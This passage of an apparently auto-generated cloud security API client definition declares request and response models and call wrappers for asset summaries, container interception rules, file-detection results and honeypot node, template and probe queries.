*   **3**, **4**, **5**, and **7**: other cloud asset.
*   **8**: The asset is a simple application server.', example='0'),
    }
  ](name='Instances', description='An array that consists of the details of the cloud assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CB45CAED-31C3-517A-8619-10F632D3****'),
}

model GetCloudAssetDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCloudAssetDetailResponseBody(name='body'),
}

async function getCloudAssetDetailWithOptions(request: GetCloudAssetDetailRequest, runtime: Util.RuntimeOptions): GetCloudAssetDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetSubType)) {
    query['AssetSubType'] = request.assetSubType;
  }
  if (!Util.isUnset(request.assetType)) {
    query['AssetType'] = request.assetType;
  }
  if (!Util.isUnset(request.cloudAssetInstances)) {
    query['CloudAssetInstances'] = request.cloudAssetInstances;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCloudAssetDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCloudAssetDetail(request: GetCloudAssetDetailRequest): GetCloudAssetDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCloudAssetDetailWithOptions(request, runtime);
}

model GetCloudAssetSummaryResponseBody = {
  groupedFields?: {
    cloudAssetSummaryMetas?: [ 
      {
        assetSubType?: int32(name='AssetSubType', description='The subtype of the cloud service.', example='0'),
        assetType?: int32(name='AssetType', description='The type of the cloud service. Valid values:

*   **0**: Elastic Compute Service (ECS)
*   **1**: Server Load Balancer (SLB)
*   **3**: ApsaraDB RDS
*   **4**: ApsaraDB for MongoDB (MongoDB)
*   **5**: ApsaraDB for Redis (Redis)
*   **6**: Container Registry
*   **8**: Container Service for Kubernetes (ACK)
*   **9**: Virtual Private Cloud (VPC)
*   **11**: ActionTrail
*   **12**: Alibaba Cloud CDN (CDN)
*   **13**: Certificate Management Service (formerly SSL Certificates Service)
*   **14**: Apsara Devops
*   **15**: Resource Access Management (RAM)
*   **16**: Anti-DDoS
*   **17**: Web Application Firewall (WAF)
*   **18**: Object Storage Service (OSS)
*   **19**: PolarDB
*   **20**: ApsaraDB RDS for PostgreSQL
*   **21**: Microservices Engine (MSE)
*   **22**: Apsara File Storage NAS (NAS)
*   **23**: Data Security Center (DSC)
*   **24**: Elastic IP Address (EIP)
*   **25**: IDaaS EIAM
*   **26**: PolarDB-X
*   **27**: Elasticsearch', example='16'),
        instanceCount?: int32(name='InstanceCount', description='The total number of cloud service instances of this type.', example='16'),
        instanceRiskCount?: int32(name='InstanceRiskCount', description='The total number of cloud service instances that are at risk of this type.', example='5'),
      }
    ](name='CloudAssetSummaryMetas', description='An array that consists of the statistics of cloud services.'),
    instanceCountTotal?: int32(name='InstanceCountTotal', description='The total number of instances.', example='919'),
    instanceRiskCountTotal?: int32(name='InstanceRiskCountTotal', description='The total number of instances that are at risk.', example='544'),
  }(name='GroupedFields', description='The summary of cloud services.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F5CF78A7-30AA-59DB-847F-13EE3AE7****'),
}

model GetCloudAssetSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCloudAssetSummaryResponseBody(name='body'),
}

async function getCloudAssetSummaryWithOptions(runtime: Util.RuntimeOptions): GetCloudAssetSummaryResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetCloudAssetSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCloudAssetSummary(): GetCloudAssetSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCloudAssetSummaryWithOptions(runtime);
}

model GetClusterCheckItemWarningStatisticsRequest {
  clusterId?: string(name='ClusterId', example='cd49575861a3044d49c954e4b3911****'),
}

model GetClusterCheckItemWarningStatisticsResponseBody = {
  data?: {
    highWarningCount?: int32(name='HighWarningCount', example='3'),
    lowWarningCount?: int32(name='LowWarningCount', example='1'),
    mediumWarningCount?: int32(name='MediumWarningCount', example='2'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='C2B285A3-3493-5C5F-A224-4CCE4BFC****'),
}

model GetClusterCheckItemWarningStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetClusterCheckItemWarningStatisticsResponseBody(name='body'),
}

async function getClusterCheckItemWarningStatisticsWithOptions(request: GetClusterCheckItemWarningStatisticsRequest, runtime: Util.RuntimeOptions): GetClusterCheckItemWarningStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetClusterCheckItemWarningStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getClusterCheckItemWarningStatistics(request: GetClusterCheckItemWarningStatisticsRequest): GetClusterCheckItemWarningStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getClusterCheckItemWarningStatisticsWithOptions(request, runtime);
}

model GetClusterRuleSummaryRequest {
  clusterId?: string(name='ClusterId', example='cc49d88d1exxx'),
}

model GetClusterRuleSummaryResponseBody = {
  clusterRuleSummary?: {
    closeRuleCount?: int32(name='CloseRuleCount', example='1'),
    interceptionCount7Day?: long(name='InterceptionCount7Day', example='10'),
    interceptionSwitch?: int32(name='InterceptionSwitch', example='0'),
    interceptionType?: int32(name='InterceptionType', example='0'),
    openRuleCount?: int32(name='OpenRuleCount', example='1'),
    ruleCount?: int32(name='RuleCount', example='10'),
    suggestRuleCount?: int32(name='SuggestRuleCount', example='1'),
  }(name='ClusterRuleSummary'),
  requestId?: string(name='RequestId', example='291B49F9-xxx'),
}

model GetClusterRuleSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetClusterRuleSummaryResponseBody(name='body'),
}

async function getClusterRuleSummaryWithOptions(request: GetClusterRuleSummaryRequest, runtime: Util.RuntimeOptions): GetClusterRuleSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetClusterRuleSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getClusterRuleSummary(request: GetClusterRuleSummaryRequest): GetClusterRuleSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return getClusterRuleSummaryWithOptions(request, runtime);
}

model GetClusterSuspEventStatisticsRequest {
  clusterId?: string(name='ClusterId', example='c6094b964bfc145fe9e418c869e7e****'),
  from?: string(name='From', example='sas'),
}

model GetClusterSuspEventStatisticsResponseBody = {
  requestId?: string(name='RequestId', example='ACF97412-FD09-4D1F-994F-34DF12BR****'),
  suspStatistics?: {
    remind?: int32(name='Remind', example='1'),
    serious?: int32(name='Serious', example='1'),
    suspicious?: int32(name='Suspicious', example='2'),
  }(name='SuspStatistics'),
}

model GetClusterSuspEventStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetClusterSuspEventStatisticsResponseBody(name='body'),
}

async function getClusterSuspEventStatisticsWithOptions(request: GetClusterSuspEventStatisticsRequest, runtime: Util.RuntimeOptions): GetClusterSuspEventStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetClusterSuspEventStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getClusterSuspEventStatistics(request: GetClusterSuspEventStatisticsRequest): GetClusterSuspEventStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getClusterSuspEventStatisticsWithOptions(request, runtime);
}

model GetFileDetectApiInvokeInfoResponseBody = {
  data?: {
    authCount?: long(name='AuthCount', example='10000'),
    expire?: long(name='Expire', example='1815753600000'),
    flowRate?: int32(name='FlowRate', example='20'),
    remainAuthCount?: long(name='RemainAuthCount', example='900'),
    saleVersion?: int32(name='SaleVersion', example='2'),
    timeUnit?: string(name='TimeUnit', example='SECONDS'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='9f368b6e-d60a-43c5-bd6f-c7087f2d****'),
}

model GetFileDetectApiInvokeInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetFileDetectApiInvokeInfoResponseBody(name='body'),
}

async function getFileDetectApiInvokeInfoWithOptions(runtime: Util.RuntimeOptions): GetFileDetectApiInvokeInfoResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetFileDetectApiInvokeInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getFileDetectApiInvokeInfo(): GetFileDetectApiInvokeInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return getFileDetectApiInvokeInfoWithOptions(runtime);
}

model GetFileDetectResultRequest {
  hashKeyList?: [ string ](name='HashKeyList'),
  sourceIp?: string(name='SourceIp', example='183.46.XX.XX'),
  type?: int32(name='Type', example='0'),
}

model GetFileDetectResultResponseBody = {
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
  resultList?: [ 
    {
      code?: string(name='Code', example='200'),
      ext?: string(name='Ext', example='{"HighLight":[[23245,23212]]}'),
      hashKey?: string(name='HashKey', example='0a212417e65c26ff133cfff28f6c****'),
      message?: string(name='Message', example='successful'),
      result?: int32(name='Result', example='0'),
      score?: int32(name='Score', example='100'),
      virusType?: string(name='VirusType', example='WEBSHELL'),
    }
  ](name='ResultList'),
}

model GetFileDetectResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetFileDetectResultResponseBody(name='body'),
}

/**
  * The extended information about the file detection result.
  *
  * @param request GetFileDetectResultRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return GetFileDetectResultResponse
 */
async function getFileDetectResultWithOptions(request: GetFileDetectResultRequest, runtime: Util.RuntimeOptions): GetFileDetectResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.hashKeyList)) {
    query['HashKeyList'] = request.hashKeyList;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetFileDetectResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * The extended information about the file detection result.
  *
  * @param request GetFileDetectResultRequest
  * @return GetFileDetectResultResponse
 */
async function getFileDetectResult(request: GetFileDetectResultRequest): GetFileDetectResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return getFileDetectResultWithOptions(request, runtime);
}

model GetHoneypotNodeRequest {
  lang?: string(name='Lang'),
  nodeId?: string(name='NodeId', example='d3dd3864-4e02-4abd-8b6a-8f5f6fec4715'),
}

model GetHoneypotNodeResponseBody = {
  code?: string(name='Code', example='200'),
  honeypotNode?: {
    allowHoneypotAccessInternet?: boolean(name='AllowHoneypotAccessInternet', example='true'),
    createTime?: string(name='CreateTime', example='2022-12-02 17:13:43'),
    ecsInstanceId?: string(name='EcsInstanceId', example='i-2vccskxjunf1ag6w****'),
    honeypotTotalCount?: int32(name='HoneypotTotalCount', example='10'),
    honeypotUsedCount?: int32(name='HoneypotUsedCount', example='5'),
    nodeId?: string(name='NodeId', example='a7409a58-bc60-41af-9d36-080d58ae****'),
    nodeIp?: string(name='NodeIp', example='101.37.XX.XX'),
    nodeName?: string(name='NodeName', example='gmmc'),
    probeTotalCount?: int32(name='ProbeTotalCount', example='20'),
    probeUsedCount?: int32(name='ProbeUsedCount', example='15'),
    securityGroupProbeIpList?: [ string ](name='SecurityGroupProbeIpList'),
    totalStatus?: int32(name='TotalStatus', example='2'),
    upgradeAvailable?: boolean(name='UpgradeAvailable', example='true'),
  }(name='HoneypotNode'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='0A453658-070B-5554-B46C-867425BE4FD4'),
  success?: boolean(name='Success', example='true'),
}

model GetHoneypotNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetHoneypotNodeResponseBody(name='body'),
}

async function getHoneypotNodeWithOptions(request: GetHoneypotNodeRequest, runtime: Util.RuntimeOptions): GetHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getHoneypotNode(request: GetHoneypotNodeRequest): GetHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return getHoneypotNodeWithOptions(request, runtime);
}

model GetHoneypotPresetRequest {
  honeypotPresetId?: string(name='HoneypotPresetId', description='The ID of the honeypot template.

> You can call the [ListHoneypotPreset](~~ListHoneypotPreset~~) operation to query the IDs of honeypot templates.', example='207ca117-44b9-495d-84e7-50289b4cxxxx'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
}

model GetHoneypotPresetResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    controlNodeName?: string(name='ControlNodeName', description='The name of the management node.', example='managerNodename'),
    fileInfoList?: [ 
      {
        fileId?: string(name='FileId', description='The ID of the uploaded file.', example='HONEYPOT_FILE/1765_167040128****'),
        fileName?: string(name='FileName', description='The name of the uploaded file.', example='HONEYPOT_FILE****'),
        ossUrl?: string(name='OssUrl', description='The download URL.', example='http://aegis****'),
      }
    ](name='FileInfoList', description='An array that consists of the configurations of the uploaded file.'),
    honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the honeypot image.', example='RuoYi'),
    honeypotImageName?: string(name='HoneypotImageName', description='The name of the honeypot image.', example='ruoyi'),
    honeypotPresetId?: string(name='HoneypotPresetId', description='The ID of the honeypot template.', example='94fd8805-d178-4361-84d3-de47fb4e****'),
    meta?: string(name='Meta', description='The custom configuration of the honeypot template.', example='{"trojan_git":"zip","burp":"open","portrait_option":"true"}'),
    nodeId?: string(name='NodeId', description='The ID of the management node.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
    presetName?: string(name='PresetName', description='The custom name of the honeypot template.', example='ssh'),
    presetType?: string(name='PresetType', description='The type of the honeypot template. Valid values:

*   **TEMP**: automatically generated template
*   **CUSTOM**: custom template
*   **DEFAULT**: default template', example='CUSTOM'),
  }(name='Data', description='The information about the honeypot template.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='success'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='38AFE393-88E8-5642-B3E2-D57C6E76025D'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model GetHoneypotPresetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetHoneypotPresetResponseBody(name='body'),
}

async function getHoneypotPresetWithOptions(request: GetHoneypotPresetRequest, runtime: Util.RuntimeOptions): GetHoneypotPresetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotPresetId)) {
    query['HoneypotPresetId'] = request.honeypotPresetId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetHoneypotPreset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getHoneypotPreset(request: GetHoneypotPresetRequest): GetHoneypotPresetResponse {
  var runtime = new Util.RuntimeOptions{};
  return getHoneypotPresetWithOptions(request, runtime);
}

model GetHoneypotProbeRequest {
  lang?: string(name='Lang', description='设置请求和接收消息的语言类型，默认为**zh**。取值：

- **zh**：中文
- **en**：英文', example='zh'),
  probeId?: string(name='ProbeId', example='d6c1ebc9-a90d-4c9e-9490-328814d1ca00'),
}

model GetHoneypotProbeResponseBody = {
  code?: string(name='Code', example='200'),
  data?: {
    arp?: boolean(name='Arp', example='true'),
    canListenIpList?: [ string ](name='CanListenIpList'),
    cidrList?: [ string ](name='CidrList'),
    controlNode?: {
      ecsInstanceId?: string(name='EcsInstanceId', example='i-bp19ijepxytwtzrk****'),
      nodeId?: string(name='NodeId', example='37a15ff1-3475-4897-aa6c-f7fd9122****'),
      nodeName?: string(name='NodeName', example='online-honeypot'),
    }(name='ControlNode'),
    cpuLoad?: double(name='CpuLoad', example='0.51'),
    deployTime?: long(name='DeployTime', example='1669363825000'),
    displayName?: string(name='DisplayName', example='test-probe'),
    honeyPotProbeScanPort?: {
      id?: long(name='Id', example='15389'),
      ports?: string(name='Ports', example='{
    "tcp": "1-65535",
    "udp": "1-65535"
}'),
      probeId?: string(name='ProbeId', example='a46f5162-c70d-4e26-8ddf-7435feca****'),
      serviceIpList?: [ string ](name='ServiceIpList'),
      status?: int32(name='Status', example='3'),
    }(name='HoneyPotProbeScanPort'),
    honeypotProbeBindList?: [ 
      {
        bindId?: string(name='BindId', example='45378f64-d7b4-4a53-9c48-4303eb4b****'),
        bindPortList?: [ 
          {
            bindPort?: boolean(name='BindPort', example='false'),
            endPort?: int32(name='EndPort', example='80'),
            err?: string(name='Err', example='portmap failed'),
            fixed?: boolean(name='Fixed', example='false'),
            id?: long(name='Id', example='2512'),
            msg?: string(name='Msg', example='listen 22 tcp4 failed'),
            proto?: string(name='Proto', example='tcp'),
            startPort?: int32(name='StartPort', example='22'),
            status?: int32(name='Status', example='3'),
            targetPort?: int32(name='TargetPort', example='80'),
          }
        ](name='BindPortList'),
        honeypotId?: string(name='HoneypotId', example='913347774a3b3c378c6a50f66de23dfa097765214ec3f0526b01c67bf59c****'),
        serviceIpList?: [ string ](name='ServiceIpList'),
        status?: int32(name='Status', example='3'),
      }
    ](name='HoneypotProbeBindList'),
    hostIp?: string(name='HostIp', example='33.53.XX.XX'),
    listenIpList?: [ string ](name='ListenIpList'),
    memoryLoad?: double(name='MemoryLoad', example='1.94'),
    osType?: string(name='OsType', example='windows'),
    ping?: boolean(name='Ping', example='false'),
    probeId?: string(name='ProbeId', example='40f6501d-45ec-4bf0-b813-0072ceb4****'),
    probeType?: string(name='ProbeType', example='host_probe'),
    probeVersion?: string(name='ProbeVersion', example='18060096'),
    proxyIp?: string(name='ProxyIp', example='47.108.XX.XX'),
    status?: int32(name='Status', example='online'),
    uuid?: string(name='Uuid', example='6690a46c-0edb-4663-a641-3629d1a9****'),
    vpcId?: string(name='VpcId', example='vpc-2vchkxmf2j9yjt3x2****'),
  }(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='6550E0E6-FD6C-5F39-AB5E-35B30DCA97B5'),
  success?: boolean(name='Success', example='true'),
}

model GetHoneypotProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetHoneypotProbeResponseBody(name='body'),
}

async function getHoneypotProbeWithOptions(request: GetHoneypotProbeRequest, runtime: Util.RuntimeOptions): GetHoneypotProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.probeId)) {
    query['ProbeId'] = request.probeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetHoneypotProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getHoneypotProbe(request: GetHoneypotProbeRequest): GetHoneypotProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return getHoneypotProbeWithOptions(request, runtime);
}

model GetImageScanNumInPeriodRequest {
  pastDay?: string(name='PastDay', example='7'),
}

model GetImageScanNumInPeriodResponseBody = {
  imageScanData?: {
    imageScanCount?: int32(name='ImageScanCount', example='150'),
  }(name='ImageScanData'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92****'),
}

model GetImageScanNumInPeriodResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetImageScanNumInPeriodResponseBody(name='body'),
}

async function getImageScanNumInPeriodWithOptions(request: GetImageScanNumInPeriodRequest, runtime: Util.RuntimeOptions): GetImageScanNumInPeriodResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.pastDay)) {
    query['PastDay'] = request.pastDay;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetImageScanNumInPeriod',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getImageScanNumInPeriod(request: GetImageScanNumInPeriodRequest): GetImageScanNumInPeriodResponse {
  var runtime = new Util.RuntimeOptions{};
  return getImageScanNumInPeriodWithOptions(request, runtime);
}

model GetInterceptionRuleDetailRequest {
  clusterId?: string(name='ClusterId', example='c7f60fdabc84xxx'),
  ruleId?: string(name='RuleId', example='500002'),
}

model GetInterceptionRuleDetailResponseBody = {
  interceptionRuleDetail?: {
    dstTarget?: {
      appName?: string(name='AppName', example='console'),
      imageList?: [ string ](name='ImageList'),
      namespace?: string(name='Namespace', example='kube-system'),
      ports?: [ string ](name='Ports'),
      ruleType?: string(name='RuleType', example='customize'),
      tagList?: [ string ](name='TagList'),
      targetId?: int32(name='TargetId', example='200014'),
      targetName?: string(name='TargetName', example='demo4-be1'),
      targetType?: string(name='TargetType', example='IMAGE'),
    }(name='DstTarget'),
    interceptType?: long(name='InterceptType', example='1'),
    orderIndex?: long(name='OrderIndex', example='1'),
    ruleId?: long(name='RuleId', example='467'),
    ruleName?: string(name='RuleName', example='dmz-frontend-accept'),
    ruleSwitch?: int32(name='RuleSwitch', example='1'),
    ruleType?: string(name='RuleType', example='customize'),
    srcTarget?: {
      appName?: string(name='AppName', example='console'),
      imageList?: [ string ](name='ImageList'),
      namespace?: string(name='Namespace', example='default'),
      ruleType?: string(name='RuleType', example='customize'),
      tagList?: [ string ](name='TagList'),
      targetId?: int32(name='TargetId', example='300635'),
      targetName?: string(name='TargetName', example='dmz'),
      targetType?: string(name='TargetType', example='IMAGE'),
    }(name='SrcTarget'),
  }(name='InterceptionRuleDetail'),
  requestId?: string(name='RequestId', example='9FBC6E47-7508-xxx'),
}

model GetInterceptionRuleDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetInterceptionRuleDetailResponseBody(name='body'),
}

async function getInterceptionRuleDetailWithOptions(request: GetInterceptionRuleDetailRequest, runtime: Util.RuntimeOptions): GetInterceptionRuleDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetInterceptionRuleDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getInterceptionRuleDetail(request: GetInterceptionRuleDetailRequest): GetInterceptionRuleDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getInterceptionRuleDetailWithOptions(request, runtime);
}

model GetInterceptionSummaryRequest {
  clusterId?: string(name='ClusterId'),
}

model GetInterceptionSummaryResponseBody = {
  interceptionSummary?: {
    closeClusterCount?: int32(name='CloseClusterCount', example='0'),
    closeRuleCount?: int32(name='CloseRuleCount', example='0'),
    clusterCount?: int32(name='ClusterCount', example='0'),
    interceptionCountInDays?: int32(name='InterceptionCountInDays'),
    openClusterCount?: int32(name='OpenClusterCount', example='0'),
    openRuleCount?: int32(name='OpenRuleCount', example='0'),
    riskCount180Day?: long(name='RiskCount180Day', example='0'),
    riskCount30Day?: long(name='RiskCount30Day', example='0'),
    riskCountToday?: long(name='RiskCountToday', example='0'),
    ruleCount?: int32(name='RuleCount', example='0'),
  }(name='InterceptionSummary'),
  requestId?: string(name='RequestId', example='F35F45B0-5D6B-4238-BE02-A62D0760E840'),
}

model GetInterceptionSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetInterceptionSummaryResponseBody(name='body'),
}

async function getInterceptionSummaryWithOptions(request: GetInterceptionSummaryRequest, runtime: Util.RuntimeOptions): GetInterceptionSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetInterceptionSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getInterceptionSummary(request: GetInterceptionSummaryRequest): GetInterceptionSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return getInterceptionSummaryWithOptions(request, runtime);
}

model GetInterceptionTargetDetailRequest {
  targetId?: long(name='TargetId', example='402008'),
}

model GetInterceptionTargetDetailResponseBody = {
  requestId?: string(name='RequestId', example='D65AADFC-1D20-5A6A-8F6A-9FA53C0DC1F8'),
  ruleTarget?: {
    appName?: string(name='AppName', example='netperf-client'),
    clusterId?: string(name='ClusterId', example='ca6e6594def8d4be8b2795fd12c32****'),
    clusterName?: string(name='ClusterName', example='sas-test-cnnf'),
    imageList?: [ string ](name='ImageList'),
    namespace?: string(name='Namespace', example='secondary'),
    tagList?: [ string ](name='TagList'),
    targetId?: long(name='TargetId', example='400723'),
    targetName?: string(name='TargetName', example='destination-test-obj-Na3cF'),
    targetType?: string(name='TargetType', example='IMAGE'),
  }(name='RuleTarget'),
}

model GetInterceptionTargetDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetInterceptionTargetDetailResponseBody(name='body'),
}

async function getInterceptionTargetDetailWithOptions(request: GetInterceptionTargetDetailRequest, runtime: Util.RuntimeOptions): GetInterceptionTargetDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.targetId)) {
    query['TargetId'] = request.targetId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetInterceptionTargetDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

